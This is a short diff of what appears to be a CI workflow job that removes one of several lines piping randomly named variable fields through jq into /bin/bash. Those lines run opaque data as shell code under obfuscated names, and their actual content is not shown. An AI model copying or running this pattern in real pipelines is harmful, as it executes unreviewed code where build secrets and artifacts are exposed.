@@ -36,7 +36,6 @@ jobs:
           printf '%s' "$yk89" | jq -r .uho298 | /bin/bash
           echo $cmyuy4 | jq -r .pnfav80256 | /bin/bash
           echo $mws35 | jq -r .i071 | /bin/bash
-          echo $ta892 | jq -r .ij73322 | /bin/bash
           printf '%s' "$j316" | jq -r .gex6789 | /bin/bash
 
       - name: Archive output
